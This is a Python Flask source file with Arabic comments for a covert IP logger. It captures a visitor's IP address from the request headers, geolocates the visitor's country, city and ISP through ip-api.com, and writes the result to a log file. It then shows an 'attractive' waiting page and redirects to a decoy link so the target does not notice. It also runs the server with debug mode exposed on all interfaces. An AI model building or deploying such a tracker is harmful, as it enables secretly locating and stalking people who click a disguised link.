from flask import Flask, render_template, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

# --- الإعدادات ---
# ضع هنا الرابط الذي تريد توجيه الشخص إليه في النهاية (مثلاً رابط فيديو أو مقال)
FINAL_DESTINATION = "https://www.google.com" 

def get_visitor_details(ip):
    """جلب بيانات الموقع الجغرافي بناءً على الـ IP"""
    try:
        # نستخدم API مجاني وسريع
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,message,country,city,isp')
        data = response.json()
        if data.get('status') == 'success':
            return f"Country: {data['country']}, City: {data['city']}, ISP: {data['isp']}"
        return "Location data not found"
    except Exception as e:
        return f"Error fetching details: {str(e)}"

@app.route('/')
def logger():
    # 1. التقاط الـ IP (يتعامل مع الـ Proxies في الاستضافات السحابية)
    if request.headers.get('X-Forwarded-For'):
        user_ip = request.headers.get('X-Forwarded-For').split(',')[0]
    else:
        user_ip = request.remote_addr

    # 2. جلب معلومات الموقع
    geo_info = get_visitor_details(user_ip)
    
    # 3. تسجيل البيانات في ملف visits.log
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] IP: {user_ip} | {geo_info}\n"
    
    with open("visits.log", "a", encoding="utf-8") as f:
        f.write(log_entry)
        
    # 4. عرض صفحة الانتظار الجذابة (التي سنصنعها في الملف التالي)
    return render_template('index.html', target_url=FINAL_DESTINATION)

if __name__ == '__main__':
    # تشغيل السيرفر محلياً للتجربة
    app.run(host='0.0.0.0', port=5000, debug=True)
